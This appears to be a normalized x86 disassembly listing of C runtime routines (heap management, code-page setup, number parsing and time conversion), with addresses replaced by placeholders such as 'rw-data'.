cmp [ rw-data ] 0x0
mov [ ebp + 0xa ] al
pop edi
jne r-xdata
mov eax [ rw-data ]
mov al [ eax + ecx * 2 ]
and eax 0x8
leave
retn
push 0x8
push ecx
call sub_410aa5
pop ecx
pop ecx
leave
retn
push 0x1
lea eax [ ebp - 0x4 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp + 0xa ]
push 0x2
push eax
push 0x1
call sub_412d7e
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
leave
retn
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
test [ ebp - 0x4 ] 0x8
je r-xdata
push 0x1
pop eax
leave
retn
sub_40da39
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
leave
retn 0x8
sub_40da7e
push ebx
push esi
mov esi [ esp + 0x10 ]
cmp esi 0xffffffe0
jbe r-xdata
push 0x9
call sub_40e83e
mov ebx [ esp + 0x10 ]
push ebx
call sub_40e8f2
pop ecx
test eax eax
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
push 0x9
call sub_40e89f
test esi esi
pop ecx
jne r-xdata
push edi
xor edi edi
cmp esi [ rw-data ]
ja r-xdata
pop esi
pop ebx
retn
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x10
push [ rw-data ]
call [ HeapReAlloc@IAT ]
push 0x1
pop esi
push 0x9
call sub_40e89f
pop ecx
mov eax edi
pop edi
jmp r-xdata
push esi
push ebx
push eax
call sub_40f0fd
add esp 0xc
test eax eax
je r-xdata
mov edi ebx
sub_40daf5
push esi
push 0x9
call sub_40e83e
mov esi [ esp + 0xc ]
push esi
call sub_40e8f2
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x9
call sub_40e89f
pop ecx
push esi
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
mov esi [ esi - 0x4 ]
push 0x9
sub esi 0x9
call sub_40e89f
pop ecx
jmp r-xdata
mov eax esi
pop esi
retn
sub_40db3a
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push 0x19
call sub_40e83e
push [ ebp + 0x8 ]
call sub_40dce7
mov ebx eax
pop ecx
cmp ebx [ rw-data ]
pop ecx
mov [ ebp + 0x8 ] ebx
jne r-xdata
test ebx ebx
je r-xdata
xor esi esi
jmp r-xdata
call sub_40dd64
xor edx edx
mov eax rw-data
push 0x19
call sub_40e89f
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x4 ] 0x0
push 0x40
pop ecx
xor eax eax
mov edi rw-data
lea esi [ edx + edx * 2 ]
[ edi ]
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jl r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
push 0x1
pop esi
cmp eax esi
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_40dd31
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x40
and [ rw-data ] 0x0
pop ecx
xor eax eax
mov edi rw-data
cmp [ ebp - 0x18 ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_40dd8d
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or esi 0xffffffff
and [ rw-data ] 0x0
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
mov eax esi
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push ebx
call sub_40dd31
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] esi
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_40dce7
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_40dd31
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40dd64
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_40dd8d
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_412d7e
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_412a7a
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_412a7a
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_40df45
push ebp
mov ebp esp
sub esp 0xc
push ebx
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0x8 ]
mov bl [ edi ]
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] esi
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax bl
push 0x8
push eax
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
cmp bl 0x2d
mov [ ebp - 0x4 ] esi
jne r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x14 ] 0x2
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jl r-xdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
push 0x10
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov edi 0x103
mov [ ebp - 0xc ] eax
cmp bl 0x30
jne r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] ecx
cmp al 0x58
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
test eax eax
je r-xdata
mov bl [ esi + 0x1 ]
inc esi
inc esi
mov [ ebp - 0x4 ] esi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
mov eax [ rw-data ]
mov ax [ eax + esi * 2 ]
and eax edi
push edi
push esi
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp + 0x14 ]
dec [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
test al 0x8
jne r-xdata
movsx eax bl
push eax
call sub_412f2b
pop ecx
mov ecx eax
sub ecx 0x37
test eax eax
je r-xdata
mov esi [ ebp - 0x8 ]
or [ ebp + 0x14 ] 0x8
cmp esi [ ebp - 0xc ]
jb r-xdata
test al 0x4
mov esi 0x7fffffff
jne r-xdata
test ebx ebx
je r-xdata
imul esi [ ebp + 0x10 ]
add esi ecx
mov [ ebp - 0x8 ] esi
jne r-xdata
call sub_40e7ac
test [ ebp + 0x14 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x1
movzx esi bl
jle r-xdata
or [ ebp + 0x14 ] 0x4
jmp r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ecx edx
jbe r-xdata
mov eax [ ebp + 0x14 ]
and al 0x2
neg al
sbb eax eax
neg eax
add eax esi
mov [ ebp - 0x8 ] eax
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
test ebx ebx
je r-xdata
and eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov bl [ eax ]
jmp r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x80000000
ja r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
neg eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] esi
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40e161
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
je r-xdata
mov esi [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov [ ecx ] 0x2d
inc ecx
neg esi
jmp r-xdata
add bl 0x30
add bl 0x57
jmp r-xdata
mov edi ecx
mov eax esi
xor edx edx
div [ ebp + 0x10 ]
mov eax esi
mov ebx edx
xor edx edx
div [ ebp + 0x10 ]
cmp ebx 0x9
mov esi eax
jbe r-xdata
and [ ecx ] 0x0
dec ecx
mov [ ecx ] bl
inc ecx
test esi esi
ja r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
mov [ edi ] al
dec ecx
inc edi
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40e1bd
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e161
mov eax [ ebp + 0xc ]
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jge r-xdata
push 0x1
pop eax
sub_40e254
push ebp
mov ebp esp
add esp 0xfffffff4
fwait
fnstcw [ ebp - 0x2 ]
fwait
mov ax [ ebp - 0x2 ]
or ah 0xc
mov [ ebp - 0x4 ] ax
fldcw [ ebp - 0x4 ]
fistp [ ebp - 0xc ]
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
leave
retn
sub_40e27b
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push esi
mov dx [ ecx ]
lea esi [ eax + 0x2 ]
mov [ eax ] dx
pop esi
retn
mov dx [ ecx ]
mov [ esi ] dx
inc esi
inc esi
jmp r-xdata
inc ecx
inc ecx
test dx dx
je r-xdata
sub_40e2a0
mov ecx [ esp + 0xc ]
push esi
push edi
mov edi [ esp + 0xc ]
test ecx ecx
mov esi edi
je r-xdata
mov eax esi
pop edi
pop esi
retn
mov edx [ esp + 0x10 ]
test ecx ecx
je r-xdata
dec ecx
jne r-xdata
dec ecx
je r-xdata
mov ax [ edx ]
mov [ edi ] ax
inc edi
inc edi
inc edx
inc edx
test ax ax
je r-xdata
xor eax eax
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
sub_40e2eb
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x14 ]
cmp ecx 0x45
jl r-xdata
or eax 0xffffffff
cmp ecx 0x8b
jg r-xdata
mov esi [ edi + 0x10 ]
test esi esi
jl r-xdata
push ebx
mov eax esi
push 0xc
cdq
pop ebx
idiv ebx
push ebx
add ecx eax
mov eax esi
cdq
pop esi
pop ebx
idiv esi
test edx edx
mov [ edi + 0x10 ] edx
jge r-xdata
cmp esi 0xb
jle r-xdata
cmp ecx 0x45
jl r-xdata
add edx 0xc
dec ecx
mov [ edi + 0x10 ] edx
mov edx [ edi + 0x10 ]
test cl 0x3
mov eax [ edx * 4 + rw-data ]
jne r-xdata
cmp ecx 0x8b
jg r-xdata
lea edx [ ecx - 0x1 ]
imul ecx ecx 0x16d
sar edx 0x2
add eax edx
lea eax [ ecx + eax - 0x63df ]
mov ecx [ edi + 0xc ]
test eax eax
lea esi [ eax + ecx ]
jl r-xdata
cmp edx 0x1
jle r-xdata
test ecx ecx
jge r-xdata
test ecx ecx
jl r-xdata
inc eax
lea ecx [ esi + esi * 2 ]
shl ecx 0x3
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x18
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x8 ]
test ecx ecx
lea esi [ eax + ecx ]
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
mov ecx esi
imul ecx ecx 0x3c
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x3c
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x4 ]
test ecx ecx
lea esi [ eax + ecx ]
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
mov ecx esi
imul ecx ecx 0x3c
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x3c
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi ]
test ecx ecx
lea edx [ eax + ecx ]
mov [ ebp + 0x8 ] edx
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
test edx edx
jge r-xdata
test edx edx
jl r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_40e4cf
test eax eax
pop ecx
je r-xdata
call sub_4135f4
mov eax [ rw-data ]
add [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_40e5d9
test eax eax
pop ecx
je r-xdata
jmp r-xdata
push 0x9
mov esi eax
mov eax [ ebp + 0x8 ]
pop ecx
[ edi ] [ esi ]
jmp r-xdata
mov ecx [ edi + 0x20 ]
test ecx ecx
jg r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ rw-data ]
add [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_40e5d9
pop ecx
jmp r-xdata
jge r-xdata
cmp [ eax + 0x20 ] 0x0
jle r-xdata
sub_40e4cf
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
mov esi [ eax ]
xor ebx ebx
call sub_40fcc3
test esi esi
mov edi eax
jge r-xdata
cmp [ edi + 0x40 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ edi + 0x40 ]
push 0x24
call sub_40bb22
pop ecx
mov [ edi + 0x40 ] eax
test eax eax
mov ecx rw-data
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov [ ecx + 0x14 ] edx
cdq
mov edi 0x15180
idiv edi
mov edi rw-data
mov [ ecx + 0x1c ] eax
imul eax eax 0xfffeae80
add esi eax
test ebx ebx
jne r-xdata
sub esi eax
inc edx
cmp esi eax
jl r-xdata
mov eax esi
mov edi 0x7861f80
cdq
idiv edi
mov edx eax
imul edx edx 0xf879e080
add esi edx
lea edx [ eax * 4 + 0x46 ]
mov eax 0x1e13380
cmp esi eax
jl r-xdata
mov edx [ ecx + 0x1c ]
push 0x1
pop eax
lea ebx [ edi + 0x4 ]
mov edi rw-data
sub esi eax
mov eax 0x1e28500
inc edx
cmp esi eax
jl r-xdata
mov edx [ ecx + 0x1c ]
dec eax
mov [ ecx + 0x10 ] eax
push 0x7
sub edx [ edi + eax * 4 ]
mov eax [ esp + 0x14 ]
mov edi 0x15180
mov [ ecx + 0xc ] edx
mov eax [ eax ]
cdq
idiv edi
pop edi
push 0x3c
add eax 0x4
cdq
idiv edi
mov eax esi
mov edi 0xe10
mov [ ecx + 0x18 ] edx
cdq
idiv edi
pop edi
mov [ ecx + 0x8 ] eax
imul eax eax 0xfffff1f0
add esi eax
mov eax esi
cdq
idiv edi
mov [ ecx + 0x4 ] eax
imul eax eax 0x3c
sub esi eax
and [ ecx + 0x20 ] 0x0
mov [ ecx ] esi
mov eax ecx
inc eax
add ebx 0x4
jmp r-xdata
push 0x1
pop ebx
inc edx
sub esi eax
jmp r-xdata
cmp [ ebx ] edx
jge r-xdata
sub_40e5d9
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
jge r-xdata
call sub_4135f4
mov eax [ esi ]
cmp eax 0x3f480
jle r-xdata
xor eax eax
jmp r-xdata
push esi
call sub_40e4cf
mov esi eax
push esi
call sub_4138a9
pop ecx
test eax eax
mov eax [ esi ]
pop ecx
je r-xdata
cmp eax 0x7ffc0b7f
jge r-xdata
pop esi
pop ebp
retn
sub eax [ rw-data ]
push edi
push 0x3c
mov [ ebp + 0x8 ] eax
pop ecx
cdq
mov edi ecx
idiv edi
test edx edx
mov [ esi ] edx
jge r-xdata
sub eax [ rw-data ]
sub eax [ rw-data ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_40e4cf
cmp [ rw-data ] 0x0
pop ecx
mov esi eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi ecx
cdq
idiv edi
add eax [ esi + 0x4 ]
mov [ ebp + 0x8 ] eax
cdq
idiv edi
pop edi
test edx edx
mov [ esi + 0x4 ] edx
jge r-xdata
add edx ecx
mov [ esi ] edx
sub [ ebp + 0x8 ] ecx
mov eax esi
push esi
call sub_4138a9
test eax eax
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x18
cdq
idiv ecx
pop ecx
add eax [ esi + 0x8 ]
mov [ ebp + 0x8 ] eax
cdq
idiv ecx
test edx edx
mov [ esi + 0x8 ] edx
jge r-xdata
add edx 0x3c
mov [ esi + 0x4 ] edx
sub [ ebp + 0x8 ] ecx
mov eax [ rw-data ]
sub [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_40e4cf
mov esi eax
pop ecx
mov [ esi + 0x20 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push 0x18
cdq
pop ecx
idiv ecx
mov ecx eax
test ecx ecx
mov [ ebp + 0x8 ] ecx
jle r-xdata
add edx ecx
mov [ esi + 0x8 ] edx
sub [ ebp + 0x8 ] ecx
jge r-xdata
mov eax [ esi + 0x18 ]
push 0x7
add eax ecx
pop ecx
cdq
idiv ecx
mov [ esi + 0x18 ] edx
mov eax [ ebp + 0x8 ]
add [ esi + 0xc ] eax
mov eax [ esi + 0x18 ]
push 0x7
lea eax [ eax + ecx + 0x7 ]
pop ecx
cdq
idiv ecx
mov [ esi + 0x18 ] edx
mov eax [ ebp + 0x8 ]
add [ esi + 0xc ] eax
mov eax [ esi + 0xc ]
test eax eax
jg r-xdata
mov eax [ ebp + 0x8 ]
add [ esi + 0x1c ] eax
add eax 0x1f
dec [ esi + 0x14 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x1c ] 0x16c
mov [ esi + 0x10 ] 0xb
jmp r-xdata
sub_40e739
push esi
call sub_40e7b5
mov ecx [ esp + 0x8 ]
xor esi esi
mov [ eax ] ecx
mov eax rw-data
call sub_40e7ac
mov ecx [ esi * 8 + rw-data ]
pop esi
mov [ eax ] ecx
retn
add eax 0x8
inc esi
cmp eax rw-data
jl r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
call sub_40e7ac
mov [ eax ] 0x16
pop esi
retn
cmp ecx 0xca
ja r-xdata
call sub_40e7ac
mov [ eax ] 0xd
pop esi
retn
call sub_40e7ac
mov [ eax ] 0x8
pop esi
retn
sub_40e7be
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_40e7d9
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_40e8b4
test eax eax
jne r-xdata
push 0x1
pop eax
retn
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_40e83e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
cmp [ eax * 4 + rw-data ] 0x0
lea esi [ eax * 4 + rw-data ]
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push edi
push 0x18
call sub_40bb22
mov edi eax
pop ecx
test edi edi
jne r-xdata
push 0x11
call sub_40e83e
cmp [ esi ] 0x0
pop ecx
push edi
jne r-xdata
push 0x11
call sub_40cb90
pop ecx
call sub_40c218
pop ecx
call [ InitializeCriticalSection@IAT ]
mov [ esi ] edi
jmp r-xdata
push 0x11
call sub_40e89f
pop ecx
pop edi
sub_40e8b4
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_40e8f2
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_40e91d
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov eax [ ecx + 0x10 ]
mov esi edx
sub esi [ ecx + 0xc ]
mov ebx [ edx - 0x4 ]
add edx 0xfffffffc
push edi
shr esi 0xf
mov ecx esi
mov edi [ edx - 0x4 ]
imul ecx ecx 0x204
dec ebx
mov [ ebp - 0x4 ] edi
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx + edx ]
test cl 0x1
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov edi ebx
sar edi 0x4
dec edi
cmp edi 0x3f
jbe r-xdata
sar ecx 0x4
push 0x3f
dec ecx
pop edi
mov [ ebp + 0xc ] ecx
cmp ecx edi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x1
mov [ ebp - 0x14 ] ecx
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebx + edx + 0x4 ]
cmp ecx [ ebx + edx + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
sub edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
push 0x3f
mov [ ebp - 0x8 ] edx
dec ecx
pop edx
cmp ecx edx
mov [ ebp + 0xc ] ecx
jbe r-xdata
mov ecx [ ebx + edx + 0x8 ]
mov edi [ ebx + edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ ebx + edx + 0x4 ]
mov edi [ ebx + edx + 0x8 ]
add ebx [ ebp - 0x8 ]
mov [ ecx + 0x8 ] edi
mov [ ebp - 0xc ] ebx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
add ebx [ ebp - 0x4 ]
mov edi ebx
mov [ ebp - 0xc ] ebx
sar edi 0x4
dec edi
cmp edi edx
jbe r-xdata
mov [ ebp + 0xc ] edx
mov ecx edx
add ecx 0xffffffe0
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0xc4 ] edi
dec [ ecx ]
jne r-xdata
mov edi 0x80000000
shr edi cl
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0x44 ] edi
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ edx ] ebx
mov [ ebx + edx - 0x4 ] ebx
dec [ eax ]
jne r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
cmp ecx edi
je r-xdata
mov edi edx
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edi
mov ecx [ ebp + 0x8 ]
and [ ecx ] edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call edi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
